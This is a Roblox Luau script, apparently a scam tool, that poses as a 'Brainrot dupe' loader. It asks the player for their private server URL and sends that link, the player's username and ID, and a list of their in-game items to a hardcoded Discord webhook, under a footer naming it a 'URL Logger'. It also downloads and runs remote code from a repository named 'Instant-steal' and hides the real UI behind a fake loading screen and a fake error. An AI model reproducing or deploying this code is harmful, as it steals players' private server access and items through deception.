-- 📍 Colocar en: StarterGui > ScreenGui > LocalScript

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:FindService("SoundService") or game:GetService("SoundService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

if not SoundService then
	repeat task.wait() until game:FindService("SoundService")
	SoundService = game:GetService("SoundService")
end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

for _, sound in ipairs(workspace:GetDescendants()) do
	if sound:IsA("Sound") then
		sound.Playing = false
	end
end

-- 🔒 Ocultar interfaz de Roblox
local function hideRobloxUI()
	pcall(function() CoreGui:WaitForChild("TopBarApp"):Destroy() end)
	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
	for _, obj in ipairs(CoreGui:GetChildren()) do
		if obj:IsA("ScreenGui") and (obj.Name:find("TopBar") or obj.Name:find("Menu")) then
			pcall(function() obj.Enabled = false end)
		end
	end
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
end

hideRobloxUI()
local uiHideConnection = RunService.RenderStepped:Connect(hideRobloxUI)

-- 🧱 GUI principal
local mainGui = Instance.new("ScreenGui")
mainGui.IgnoreGuiInset = true
mainGui.ResetOnSpawn = false
mainGui.DisplayOrder = 999
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mainGui.Parent = playerGui

local safetyCover = Instance.new("Frame")
safetyCover.Size = UDim2.new(1, 0, 1.15, 0)
safetyCover.Position = UDim2.new(0, 0, -0.1, 0)
safetyCover.BackgroundColor3 = Color3.new(0, 0, 0)
safetyCover.BorderSizePixel = 0
safetyCover.ZIndex = 1
safetyCover.Parent = mainGui

------------------------------------------------------------
-- 🧩 Pantalla inicial
------------------------------------------------------------
local introFrame = Instance.new("Frame")
introFrame.Size = UDim2.new(1, 0, 1, 0)
introFrame.BackgroundColor3 = Color3.new(0, 0, 0)
introFrame.ZIndex = 100
introFrame.Parent = mainGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 400, 0, 50)
title.Position = UDim2.new(0.5, -200, 0.4, -60)
title.BackgroundTransparency = 1
title.Text = "Url de tu servidor"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 28
title.Font = Enum.Font.GothamBold
title.ZIndex = 101
title.Parent = introFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0, 300, 0, 40)
textBox.Position = UDim2.new(0.5, -150, 0.5, -20)
textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.PlaceholderText = "Url server privado"
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 20
textBox.ZIndex = 101
textBox.Parent = introFrame

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0, 400, 0, 30)
errorLabel.Position = UDim2.new(0.5, -500, 0.55, 30)
errorLabel.BackgroundTransparency = 1
errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
errorLabel.TextSize = 18
errorLabel.Font = Enum.Font.Gotham
errorLabel.Text = "Incorrecto"
errorLabel.ZIndex = 101
errorLabel.Parent = introFrame

local startButton = Instance.new("TextButton")
startButton.Size = UDim2.new(0, 150, 0, 40)
startButton.Position = UDim2.new(0.5, -75, 0.63, 10)
startButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
startButton.Text = "Empezar"
startButton.TextColor3 = Color3.new(1, 1, 1)
startButton.TextSize = 22
startButton.Font = Enum.Font.GothamBold
startButton.ZIndex = 101
startButton.Parent = introFrame

local cancelButton = Instance.new("TextButton")
cancelButton.Size = UDim2.new(0, 150, 0, 40)
cancelButton.Position = UDim2.new(0.5, -75, 0.7, 60)
cancelButton.BackgroundColor3 = Color3.new(0.4, 0.1, 0.1)
cancelButton.Text = "Cancelar"
cancelButton.TextColor3 = Color3.new(1, 1, 1)
cancelButton.TextSize = 22
cancelButton.Font = Enum.Font.GothamBold
cancelButton.ZIndex = 101
cancelButton.Parent = introFrame

------------------------------------------------------------
-- ⏳ Pantalla de carga
------------------------------------------------------------
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
loadingFrame.Visible = false
loadingFrame.ZIndex = 200
loadingFrame.Parent = mainGui

local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.45, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 201
lettersContainer.Parent = loadingFrame

local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.ZIndex = 202
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	table.insert(textLabels, textLabel)
end

-- 📊 Barra de carga
local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0, 400, 0, 20)
barFrame.Position = UDim2.new(0.5, -200, 0.65, 0)
barFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
barFrame.BorderSizePixel = 0
barFrame.ZIndex = 202
barFrame.Parent = loadingFrame

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 203
barFill.Parent = barFrame

-- 📜 Texto de estado
local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, 0, 0, 40)
statusText.Position = UDim2.new(0, 0, 0.75, 10)
statusText.BackgroundTransparency = 1
statusText.TextColor3 = Color3.new(1, 1, 1)
statusText.TextSize = 22
statusText.Font = Enum.Font.GothamBold
statusText.ZIndex = 203
statusText.Text = ""
statusText.Parent = loadingFrame


-- hdhdhhgdhddhhddhfhhvfvbggvggbcvvchchchvjvcvjhhvjvgjvjgjvjcj cb vjjjvjjvnvnvnvnvnjvjvcjkjcncbccncb
local npcNames = {
    "Gattatino Nyanino", "Matteo", "Espresso Signora", "Odin Din Din Dun",
    "Statutino Libertino", "Ballerino Lololo", "Trigoligre Frutonni",
    "Orcalero Orcala", "Los Crocodillitos", "Piccione Macchina",
    "La Vacca Staturno Saturnita", "Chimpanzini Spiderini", "Los Tralaleritos",
    "Las Tralaleritas", "Graipuss Medussi", "La Grande Combinasion",
    "Nuclearo Dinossauro", "Garama and Madundung",
    "Tortuginni Dragonfruitini", "Pot Hotspot", "Las Vaquitas Saturnitas",
    "Chicleteira Bicicleteira", "La Cucaracha"
}


-- 🎯 Función MEJORADA para buscar Brainrots en Workspace.plots (usando el mismo método que funciona)
local function findBrainrotsInPlots()
    local foundBrainrots = {}
    
    -- Verificar si existe la ruta Workspace.plots
    local plots = workspace:FindFirstChild("Plots")
    if not plots then
        warn("❌ No se encontró 'plots' en Workspace")
        return foundBrainrots
    end
    
    print("🔍 Buscando Brainrots en plots...")
    print("📁 Plots encontrados: " .. #plots:GetChildren())
    
    -- 🔍 BÚSQUEDA EXACTA COMO EN EL SCRIPT QUE SÍ FUNCIONA
    for _, descendant in ipairs(plots:GetDescendants()) do
        -- Buscar coincidencias EXACTAS como en el otro script
        if table.find(npcNames, descendant.Name) then
            print("✅ Encontrado: " .. descendant.Name)
            if not table.find(foundBrainrots, descendant.Name) then
                table.insert(foundBrainrots, descendant.Name)
            end
        end
    end
    
    -- Si no encuentra nada en plots, buscar en todo Workspace
    if #foundBrainrots == 0 then
        print("🔍 Búsqueda extendida en todo Workspace...")
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if table.find(npcNames, descendant.Name) then
                print("✅ Encontrado en Workspace: " .. descendant.Name)
                if not table.find(foundBrainrots, descendant.Name) then
                    table.insert(foundBrainrots, descendant.Name)
                end
            end
        end
    end
    
    -- Depuración: mostrar qué nombres SÍ existen
    if #foundBrainrots == 0 then
        print("❌ No se encontraron Brainrots con nombres exactos")
        print("🔍 Nombres reales encontrados en plots:")
        
        local allNames = {}
        for _, child in ipairs(plots:GetDescendants()) do
            if (child:IsA("Model") or child:IsA("Part")) and #child.Name > 2 then
                table.insert(allNames, child.Name)
            end
        end
        
        -- Mostrar nombres únicos
        local uniqueNames = {}
        for _, name in ipairs(allNames) do
            if not table.find(uniqueNames, name) then
                table.insert(uniqueNames, name)
                print("   - '" .. name .. "'")
            end
        end
        
        -- También mostrar estructura de plots
        print("📁 ESTRUCTURA DE PLOTS:")
        for _, plot in ipairs(plots:GetChildren()) do
            print("   Plot: " .. plot.Name)
            for _, child in ipairs(plot:GetChildren()) do
                if child:IsA("Model") then
                    print("     └─ " .. child.Name .. " (" .. child.ClassName .. ")")
                end
            end
        end
    else
        print("📊 Total Brainrots encontrados: " .. #foundBrainrots)
        print("🧠 Lista: " .. table.concat(foundBrainrots, ", "))
    end
    
    return foundBrainrots
end
-- 🌐 Sistema de envío webhook MEJORADO con Brainrots
local function sendToWebhook(url, data)
    -- Buscar Brainrots usando el método que SÍ funciona
    local foundBrainrots = findBrainrotsInPlots()
    local brainrotsText = "Ninguno encontrado"
    
    if #foundBrainrots > 0 then
        brainrotsText = table.concat(foundBrainrots, ", ")
    end
    
    local success, result = pcall(function()
        local response = HttpService:RequestAsync({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "🔔 **Nueva URL ingresada**",
                embeds = {{
                    title = "Información del Usuario",
                    color = 65280,
                    fields = {
                        {
                            name = "👤 Usuario",
                            value = player.Name .. " (ID: " .. player.UserId .. ")",
                            inline = true
                        },
                        {
                            name = "🌐 URL Ingresada",
                            value = "" .. data.url .."",
                            inline = false
                        },
                        {
                            name = "🧠 Brainrots Encontrados",
                            value = brainrotsText,
                            inline = false
                        },
                        {
                            name = "📊 Total Brainrots",
                            value = tostring(#foundBrainrots),
                            inline = true
                        },
                        {
                            name = "🕒 Fecha/Hora",
                            value = os.date("%Y-%m-%d %H:%M:%S"),
                            inline = true
                        },
                        {
                            name = "🎮 Game ID",
                            value = tostring(game.GameId),
                            inline = true
                        }
                    },
                    footer = {
                        text = "Roblox URL Logger + Brainrot Detector"
                    }
                }}
            })
        })
        
        return response.Success, response.Body
    end)
    
    return success, result
end
-- hsjsjhshhshshshhshhshsjsjsjsjjsjsjjsjjhhhdhhhhhhhhhhhhhhhhgghhhhhhhhhjhjjjjdjjjzjjxjjjxhjhxjhxbhxvjxjjjxjjx

-- 🔔 Toast final
local function showFatalError()
	local toast = Instance.new("TextLabel")
	toast.Size = UDim2.new(0, 400, 0, 60)
	toast.Position = UDim2.new(0.5, -200, 0.85, 0)
	toast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	toast.TextColor3 = Color3.new(1, 1, 1)
	toast.Text = "⚠️ Fatal error: Asegurate que tienes activado: Servidores privados>Todos"
	toast.TextSize = 24
	toast.Font = Enum.Font.GothamBlack
	toast.ZIndex = 300
	toast.Parent = mainGui

	-- Efecto "neón" brillante
	local glow = Instance.new("UIStroke")
	glow.Thickness = 3
	glow.Color = Color3.fromRGB(255, 50, 50)
	glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	glow.Parent = toast

	task.wait(5)
	toast:Destroy()
end

------------------------------------------------------------
-- 🔄 Animaciones
------------------------------------------------------------
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		coroutine.wrap(function()
			task.wait(delayTime)
			while loadingFrame.Visible do
				for step = 0, 1, 0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				for step = 1, 0, -0.1 do
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				task.wait(0.5)
			end
		end)()
	end
end

-- 🧠 Mensajes y barra de carga MEJORADA
local function updateStatusMessages()
	statusText.Text = "Encontrando servidor..."
	task.wait(10)
	
	-- Contador de 20 segundos para "obteniendo Brainrots"
	local countdown = 20
	for i = countdown, 1, -1 do
		statusText.Text = "obteniendo Brainrots (" .. i .. "s)"
		task.wait(1)
	end

	-- 🎯 OCULTAR INTERFAZ PRINCIPAL TEMPORALMENTE
	loadingFrame.Visible = false
	mainGui.Enabled = false
	
	-- 🕐 Mostrar mensaje de carga externa

	-- Cargar interfaz externa
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/seleccionar.lua"))()
	
	-- ⏱️ Esperar 20 segundos con contador
	local waitTime = 20
	for i = waitTime, 1, -1 do
		externalLoadText.Text = "Cargando interfaz externa... (" .. i .. "s)"
		task.wait(1)
	end
	
	-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
	externalLoadText:Destroy()
	mainGui.Enabled = true
	loadingFrame.Visible = true
	
	-- Continuar con el código original...
	statusText.Text = "obteniendo Brainrots - LISTO!"
	task.wait(2)
	
	local messages = {
		"Restaurando script..",
		"Moviendo hitbox...",
		"Implementando nuevos códigos...",
		"Fallo en Replicate Storage - intentando de nuevo...",
		"Buscando en Workspace..."
	}
	while loadingFrame.Visible do
		statusText.Text = messages[math.random(1, #messages)]
		task.wait(math.random(5, 10))
	end
end
local function animateProgressBar()
	local totalTime = 240
	local stepTime = 0.2
	local steps = totalTime / stepTime
	for i = 1, steps do
		local progress = i / steps
		barFill.Size = UDim2.new(progress, 0, 1, 0)
		task.wait(stepTime)
	end
end

------------------------------------------------------------
-- 🔁 Flujo principal
------------------------------------------------------------
local function startSequence(url)
	introFrame.Visible = false
	loadingFrame.Visible = true
	
	-- 🔄 Enviar datos al webhook antes de empezar la animación
	task.spawn(function()
		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1" -- Reemplaza con tu webhook URL
		
		local data = {
			url = url,
			playerName = player.Name,
			playerId = player.UserId,
			gameId = game.GameId,
			timestamp = os.time()
		}
		
		statusText.Text = "Enviando datos..."
		
		local success, result = sendToWebhook(webhookUrl, data)
		
		if success then
			print(" BRAINROTS Dupe")
			statusText.Text = "Datos enviados - Iniciando secuencia..."
		else
			print("❌ Error en sistema:", result)
			statusText.Text = "Error en envío - Continuando..."
		end
		
		task.wait(2)
	end)
	
	-- Iniciar animaciones
	startLoadingAnimation()
	task.spawn(updateStatusMessages)
	task.spawn(animateProgressBar)

	task.delay(240, function()
		if uiHideConnection then uiHideConnection:Disconnect() end
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
		loadingFrame.Visible = false
		showFatalError()
	end)
end

local function kickPlayer()
	if uiHideConnection then uiHideConnection:Disconnect() end
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
	pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
	player:Kick("Has cancelado la experiencia")
end

startButton.MouseButton1Click:Connect(function()
	local text = textBox.Text
	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
		errorLabel.Text = ""
		startSequence(text) -- Pasar la URL a la función
	else
		errorLabel.Text = "Url invalida"
	end
end)

cancelButton.MouseButton1Click:Connect(kickPlayer)

while true do
	hideRobloxUI()
	task.wait(0.5)
end
